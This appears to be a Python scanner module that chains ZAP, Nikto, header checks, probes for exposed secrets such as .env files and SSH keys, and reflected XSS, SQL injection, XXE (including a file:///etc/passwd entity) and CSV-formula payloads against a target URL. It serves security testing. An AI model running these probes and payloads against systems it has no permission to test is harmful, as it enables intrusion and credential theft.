"""
OMEN Scan Engine
Sequential attacks: ZAP Spider+Active → Nikto → Headers → Files → XSS → SQLi → XXE → CSV
Each attack updates progress live. No hard timeout — runs until complete.
"""
import os, time, subprocess, csv, io, requests
from urllib.parse import urlparse, parse_qs
from typing import List, Dict, Optional
from concurrent.futures import ThreadPoolExecutor

# ── Config ────────────────────────────────────────────────────────────────────
_TIMEOUT    = 8
_ATTACK_DIR = os.path.join(os.path.dirname(__file__), "..", "attack")
NIKTO_PATH  = os.getenv("NIKTO_PATH", "nikto")
ZAP_API_KEY  = os.getenv("ZAP_API_KEY", "")
ZAP_BASE_URL = os.getenv("ZAP_BASE_URL", "http://localhost:8080")

_SESSION = requests.Session()
_SESSION.headers.update({"User-Agent": "OMEN-Scanner/1.0"})

_progress: Dict[int, Dict[str, Dict]] = {}

ATTACKS = [
    "ZAP Spider + Scan",
    "Nikto Web Scan",
    "Security Headers Missing",
    "Sensitive File Exposure",
    "XSS (Reflected)",
    "SQL Injection",
    "XXE Injection",
    "CSV Injection",
]


# ── Payload loader ────────────────────────────────────────────────────────────

def _load(rel: str, limit: int = 60) -> List[str]:
    path = os.path.join(_ATTACK_DIR, rel)
    if not os.path.exists(path):
        return []
    out = []
    with open(path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith(("#", "/*", "*", "//")):
                out.append(line)
                if len(out) >= limit:
                    break
    return out

_SQL = _load("sql-injection-payload-list/burp-intruder-payloads.txt", 60) or \
       ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "1 OR 1=1--", "' OR 1=1#"]
_XSS = _load("xss-payload-list-main/Payloads/All-In-One.txt", 60) or \
       ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"]
_XXE = _load("xxe-injection-payload-list/Intruder/xxe-basic.txt", 20)
_CSV = _load("csv-injection-payload-list/Intruder/csv-injection-intruder.txt", 30)


# ── Progress ──────────────────────────────────────────────────────────────────

def get_scan_progress(scan_id: int) -> List[Dict]:
    return list(_progress.get(scan_id, {}).values())


def _set(scan_id: int, attack: str, status: str, found: int = 0, detail: str = ""):
    if scan_id not in _progress:
        _progress[scan_id] = {}
    _progress[scan_id][attack] = {
        "attack": attack, "status": status,
        "found": found, "detail": detail,
        "timestamp": time.time(),
    }


def _vuln(url: str, issue: str, score: float,
          evidence: str = "", param: str = "", source: str = "FastScan") -> Dict:
    return {"url": url, "param": param, "issue": issue,
            "severity": int(score), "cvss_score": score,
            "evidence": evidence, "source": source}


def _get(url: str, **kw) -> Optional[requests.Response]:
    try:
        return _SESSION.get(url, timeout=_TIMEOUT, **kw)
    except Exception:
        return None


def _post(url: str, **kw) -> Optional[requests.Response]:
    try:
        return _SESSION.post(url, timeout=_TIMEOUT, **kw)
    except Exception:
        return None


# ── Entry point ───────────────────────────────────────────────────────────────

async def run_scan(target_url: str, scan_id: int) -> List[Dict]:
    import asyncio
    _progress[scan_id] = {}
    for a in ATTACKS:
        _set(scan_id, a, "pending")
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, _run_sequential, target_url, scan_id)


def _run_sequential(target_url: str, scan_id: int) -> List[Dict]:
    """Run every attack one by one — no skipping, no timeout."""
    all_vulns: List[Dict] = []
    steps = [
        ("ZAP Spider + Scan",        _run_zap),
        ("Nikto Web Scan",           _run_nikto),
        ("Security Headers Missing",  _check_headers),
        ("Sensitive File Exposure",   _check_files),
        ("XSS (Reflected)",           _check_xss),
        ("SQL Injection",             _check_sqli),
        ("XXE Injection",             _check_xxe),
        ("CSV Injection",             _check_csv),
    ]
    for name, fn in steps:
        try:
            results = fn(target_url, scan_id)
            all_vulns.extend(results)
        except Exception as e:
            print(f"[{name}] crashed: {e}")
            _set(scan_id, name, "error", 0, str(e)[:120])
    return all_vulns


# ── ZAP Spider + Active Scan ──────────────────────────────────────────────────

_ZAP_RISK = {"High": 8.0, "Medium": 5.0, "Low": 2.0, "Informational": 0.5}

def _run_zap(target_url: str, scan_id: int) -> List[Dict]:
    _set(scan_id, "ZAP Spider + Scan", "running", detail="Connecting to ZAP...")
    vulns = []
    if not ZAP_API_KEY:
        _set(scan_id, "ZAP Spider + Scan", "done", 0, "ZAP_API_KEY not set — skipped")
        return []
    try:
        requests.get(f"{ZAP_BASE_URL}/JSON/core/view/version/",
                     params={"apikey": ZAP_API_KEY}, timeout=5).raise_for_status()

        # Spider
        _set(scan_id, "ZAP Spider + Scan", "running", detail="Spidering target (crawling all pages)...")
        r = requests.get(f"{ZAP_BASE_URL}/JSON/spider/action/scan/",
                         params={"apikey": ZAP_API_KEY, "url": target_url,
                                 "recurse": "true", "maxChildren": "20"}, timeout=30)
        r.raise_for_status()
        _poll_zap("spider", r.json().get("scan"), scan_id, "Spider")

        time.sleep(2)

        # Active scan
        _set(scan_id, "ZAP Spider + Scan", "running", detail="Running active attack scan...")
        r = requests.get(f"{ZAP_BASE_URL}/JSON/ascan/action/scan/",
                         params={"apikey": ZAP_API_KEY, "url": target_url,
                                 "recurse": "true", "scanPolicyName": ""}, timeout=30)
        if r.status_code == 200:
            _poll_zap("ascan", r.json().get("scan"), scan_id, "Active scan")

        # Harvest
        _set(scan_id, "ZAP Spider + Scan", "running", detail="Collecting alerts...")
        r = requests.get(f"{ZAP_BASE_URL}/JSON/alert/view/alerts/",
                         params={"apikey": ZAP_API_KEY, "baseurl": target_url,
                                 "start": "0", "count": "500"}, timeout=30)
        r.raise_for_status()
        for a in r.json().get("alerts", []):
            score = _ZAP_RISK.get(a.get("risk", "Low"), 2.0)
            vulns.append(_vuln(a.get("url",""), a.get("name","Unknown"), score,
                               a.get("evidence",""), a.get("param",""), "ZAP"))
    except requests.exceptions.ConnectionError:
        _set(scan_id, "ZAP Spider + Scan", "done", 0, "ZAP not running — skipped")
        return []
    except Exception as e:
        _set(scan_id, "ZAP Spider + Scan", "error", 0, str(e)[:120])
        return []

    _set(scan_id, "ZAP Spider + Scan", "done", len(vulns),
         f"Spider + active scan complete — {len(vulns)} alerts")
    return vulns


def _poll_zap(task: str, task_id: str, scan_id: int, label: str, timeout: int = 600):
    ep  = "spider" if task == "spider" else "ascan"
    url = f"{ZAP_BASE_URL}/JSON/{ep}/view/status/"
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        try:
            r = requests.get(url, params={"apikey": ZAP_API_KEY, "scanId": task_id}, timeout=8)
            pct = r.json().get("status", "0")
            _set(scan_id, "ZAP Spider + Scan", "running", detail=f"{label}: {pct}% complete")
            if pct == "100":
                return
        except Exception:
            pass
        time.sleep(5)


# ── Nikto ─────────────────────────────────────────────────────────────────────

def _run_nikto(target_url: str, scan_id: int) -> List[Dict]:
    _set(scan_id, "Nikto Web Scan", "running", detail="Starting Nikto scan...")
    vulns = []
    try:
        cmd = ["perl", NIKTO_PATH, "-h", target_url,
               "-Format", "csv", "-nointeractive", "-Tuning", "x6789abc"]
        _set(scan_id, "Nikto Web Scan", "running",
             detail=f"Running: nikto -h {target_url} (this takes 2–10 min)...")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        vulns = _parse_nikto_csv(result.stdout, target_url)
    except FileNotFoundError:
        _set(scan_id, "Nikto Web Scan", "done", 0, "Nikto/Perl not found — skipped")
        return []
    except subprocess.TimeoutExpired:
        _set(scan_id, "Nikto Web Scan", "done", 0, "Nikto timed out after 10 min")
        return []
    except Exception as e:
        _set(scan_id, "Nikto Web Scan", "error", 0, str(e)[:120])
        return []

    _set(scan_id, "Nikto Web Scan", "done", len(vulns),
         f"Nikto complete — {len(vulns)} findings")
    return vulns


def _parse_nikto_csv(output: str, base_url: str) -> List[Dict]:
    vulns = []
    for line in output.splitlines():
        if not line or line.startswith('"Host"') or line.startswith('Nikto'):
            continue
        parts = line.split(",", 7)
        if len(parts) < 7:
            continue
        desc = parts[6].strip().strip('"')
        path = parts[5].strip().strip('"') if len(parts) > 5 else ""
        host = parts[0].strip().strip('"')
        url  = f"{host}{path}" if host.startswith("http") else base_url + path
        vulns.append(_vuln(url, desc, 2.0, f"Nikto finding", "", "Nikto"))
    return vulns


# ── Security Headers ──────────────────────────────────────────────────────────

def _check_headers(target_url: str, scan_id: int) -> List[Dict]:
    _set(scan_id, "Security Headers Missing", "running", detail="Fetching HTTP response headers...")
    vulns = []
    r = _get(target_url, allow_redirects=True)
    if r:
        hdrs = {k.lower() for k in r.headers}
        checks = [
            ("content-security-policy",   "Missing Content-Security-Policy (CSP)", 6.5),
            ("strict-transport-security", "Missing HSTS header",                   6.0),
            ("x-frame-options",           "Missing X-Frame-Options (Clickjacking)",5.0),
            ("x-content-type-options",    "Missing X-Content-Type-Options",        4.0),
            ("permissions-policy",        "Missing Permissions-Policy header",     3.0),
            ("referrer-policy",           "Missing Referrer-Policy header",        2.5),
            ("x-xss-protection",          "Missing X-XSS-Protection header",      2.0),
            ("cache-control",             "Missing Cache-Control header",          1.5),
        ]
        for header, issue, score in checks:
            if header not in hdrs:
                vulns.append(_vuln(target_url, issue, score,
                                   f"Header '{header}' absent from response"))
    _set(scan_id, "Security Headers Missing", "done", len(vulns),
         f"{len(vulns)} missing security headers" if vulns else "All key headers present")
    return vulns


# ── Sensitive Files ───────────────────────────────────────────────────────────

def _check_files(target_url: str, scan_id: int) -> List[Dict]:
    paths = [
        "/.env", "/.env.local", "/.env.production", "/.env.backup", "/.env.dev",
        "/.git/config", "/.git/HEAD", "/.gitignore", "/.git/COMMIT_EDITMSG",
        "/wp-config.php", "/wp-config.php.bak", "/wp-config.php.old",
        "/.htaccess", "/.htpasswd",
        "/phpinfo.php", "/info.php", "/test.php", "/debug.php",
        "/admin/", "/admin/login", "/admin/login.php", "/administrator/",
        "/backup.zip", "/backup.tar.gz", "/backup.sql", "/backup/",
        "/db.sql", "/database.sql", "/dump.sql", "/data.sql",
        "/config.php", "/config.json", "/config.yml", "/config.yaml",
        "/secrets.json", "/credentials.json", "/api-keys.json",
        "/.DS_Store", "/server-status", "/server-info",
        "/web.config", "/crossdomain.xml", "/clientaccesspolicy.xml",
        "/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
        "/package.json", "/composer.json", "/yarn.lock", "/package-lock.json",
        "/.bash_history", "/.ssh/id_rsa", "/.ssh/authorized_keys",
    ]
    _set(scan_id, "Sensitive File Exposure", "running",
         detail=f"Probing {len(paths)} sensitive paths in parallel...")
    vulns = []
    base = target_url.rstrip("/")

    def probe(path):
        r = _get(base + path, allow_redirects=False)
        if r and r.status_code in (200, 403):
            score = 8.5 if r.status_code == 200 else 4.0
            label = "Exposed" if r.status_code == 200 else "Restricted (403 — exists)"
            return _vuln(base + path, f"Sensitive path accessible: {path}",
                         score, f"HTTP {r.status_code} — {label}")
        return None

    with ThreadPoolExecutor(max_workers=12) as ex:
        for result in ex.map(probe, paths):
            if result:
                vulns.append(result)

    _set(scan_id, "Sensitive File Exposure", "done", len(vulns),
         f"{len(vulns)} exposed paths" if vulns else f"Checked {len(paths)} paths — clean")
    return vulns


# ── XSS ───────────────────────────────────────────────────────────────────────

def _check_xss(target_url: str, scan_id: int) -> List[Dict]:
    parsed = urlparse(target_url)
    params = list(parse_qs(parsed.query).keys()) or \
             ["q", "search", "id", "input", "name", "query", "s", "keyword", "term", "text"]

    script_pl  = [p for p in _XSS if "<script" in p.lower()][:10]
    onerror_pl = [p for p in _XSS if "onerror" in p.lower()][:10]
    svg_pl     = [p for p in _XSS if "svg" in p.lower() or "onload" in p.lower()][:8]
    payloads   = script_pl + onerror_pl + svg_pl or _XSS[:25]

    combos = [(p, pl) for p in params[:8] for pl in payloads]
    _set(scan_id, "XSS (Reflected)", "running",
         detail=f"Testing {len(params)} params × {len(payloads)} payloads ({len(combos)} requests)...")

    vulns = []
    sigs  = ["<script", "onerror=", "onload=", "alert(", "javascript:", "svg/onload", "onfocus="]

    def probe(args):
        param, payload = args
        url = target_url.split("?")[0] + f"?{param}={requests.utils.quote(payload)}"
        r = _get(url, allow_redirects=True)
        if r:
            body = r.text
            decoded = requests.utils.unquote(payload)
            if decoded in body or any(s in body.lower() for s in sigs if s in payload.lower()):
                return _vuln(url, "Reflected XSS", 8.5,
                             f"Payload reflected unescaped in param '{param}'", param)
        return None

    seen = set()
    with ThreadPoolExecutor(max_workers=10) as ex:
        for result in ex.map(probe, combos):
            if result and result["param"] not in seen:
                vulns.append(result)
                seen.add(result["param"])

    _set(scan_id, "XSS (Reflected)", "done", len(vulns),
         f"{len(vulns)} vulnerable params" if vulns else f"Tested {len(combos)} combos — clean")
    return vulns


# ── SQL Injection ─────────────────────────────────────────────────────────────

_SQL_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-0", "sqlite_", "pg_query",
    "unclosed quotation", "syntax error", "odbc_exec",
    "warning: mysql", "division by zero", "supplied argument",
    "microsoft ole db", "jdbc", "sqlstate", "db2_",
    "invalid query", "mysql error", "postgresql error",
    "you have an error in your sql", "quoted string not properly terminated",
    "unterminated string", "unexpected end of sql", "invalid column",
]

def _check_sqli(target_url: str, scan_id: int) -> List[Dict]:
    parsed = urlparse(target_url)
    params = list(parse_qs(parsed.query).keys()) or \
             ["id", "search", "user", "page", "cat", "item", "product", "pid", "uid", "gid"]

    payloads = _SQL[:50]
    combos   = [(p, pl) for p in params[:8] for pl in payloads]
    _set(scan_id, "SQL Injection", "running",
         detail=f"Testing {len(params)} params × {len(payloads)} payloads ({len(combos)} requests)...")

    vulns = []

    def probe(args):
        param, payload = args
        url = target_url.split("?")[0] + f"?{param}={requests.utils.quote(payload)}"
        r = _get(url, allow_redirects=True)
        if r:
            body = r.text.lower()
            matched = next((s for s in _SQL_ERRORS if s in body), None)
            if matched:
                return _vuln(url, "SQL Injection (Error-Based)", 9.0,
                             f"DB error '{matched}' triggered via '{param}': {payload[:80]}", param)
        return None

    seen = set()
    with ThreadPoolExecutor(max_workers=10) as ex:
        for result in ex.map(probe, combos):
            if result and result["param"] not in seen:
                vulns.append(result)
                seen.add(result["param"])

    _set(scan_id, "SQL Injection", "done", len(vulns),
         f"{len(vulns)} injectable params" if vulns else f"Tested {len(combos)} combos — no errors")
    return vulns


# ── XXE ───────────────────────────────────────────────────────────────────────

_XXE_INDICATORS = [
    "root:x:", "/bin/bash", "boot.ini", "win.ini", "[fonts]",
    "daemon:", "nobody:", "www-data", "file:///", "/etc/passwd",
    "windows/system32", "[extensions]", "for 16-bit app support",
]

def _check_xxe(target_url: str, scan_id: int) -> List[Dict]:
    payloads = _XXE[:15] if _XXE else [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    ]
    _set(scan_id, "XXE Injection", "running",
         detail=f"Sending {len(payloads)} XXE payloads via POST and GET...")

    vulns = []
    for i, payload in enumerate(payloads):
        _set(scan_id, "XXE Injection", "running",
             detail=f"XXE payload {i+1}/{len(payloads)} — POST + GET...")
        r = _post(target_url, data=payload,
                  headers={"Content-Type": "application/xml", "Accept": "application/xml, */*"})
        if r and any(ind in r.text for ind in _XXE_INDICATORS):
            vulns.append(_vuln(target_url, "XXE Injection (File Disclosure)", 9.5,
                               "Server returned sensitive file content in XML response"))
            break
        r2 = _get(target_url + "?xml=" + requests.utils.quote(payload))
        if r2 and any(ind in r2.text for ind in _XXE_INDICATORS):
            vulns.append(_vuln(target_url, "XXE Injection (Reflected)", 9.0,
                               "XXE payload reflected in GET response", "xml"))
            break

    _set(scan_id, "XXE Injection", "done", len(vulns),
         "XXE confirmed" if vulns else f"Tested {len(payloads)} payloads — not vulnerable")
    return vulns


# ── CSV Injection ─────────────────────────────────────────────────────────────

def _check_csv(target_url: str, scan_id: int) -> List[Dict]:
    parsed = urlparse(target_url)
    params = list(parse_qs(parsed.query).keys()) or \
             ["name", "email", "input", "value", "data", "comment", "message", "title", "desc"]

    dangerous = [p for p in _CSV if p.startswith(("=cmd", "=DDE", "=HYPERLINK", "=IMPORTXML", "@SUM", "+1", "-1"))][:20]
    if not dangerous:
        dangerous = _CSV[:20]

    combos = [(p, pl) for p in params[:6] for pl in dangerous]
    _set(scan_id, "CSV Injection", "running",
         detail=f"Testing {len(params)} params × {len(dangerous)} payloads ({len(combos)} requests)...")

    vulns = []

    def probe(args):
        param, payload = args
        url = target_url.split("?")[0] + f"?{param}={requests.utils.quote(payload)}"
        r = _get(url, allow_redirects=True)
        if r and r.status_code == 200:
            stripped = payload.lstrip("=@+-")
            if payload in r.text or stripped in r.text:
                return _vuln(url, "CSV Injection (Formula Injection)", 7.0,
                             f"Formula reflected unescaped in '{param}': {payload[:60]}", param)
        return None

    seen = set()
    with ThreadPoolExecutor(max_workers=8) as ex:
        for result in ex.map(probe, combos):
            if result and result["param"] not in seen:
                vulns.append(result)
                seen.add(result["param"])

    _set(scan_id, "CSV Injection", "done", len(vulns),
         f"{len(vulns)} vulnerable params" if vulns else f"Tested {len(combos)} combos — clean")
    return vulns
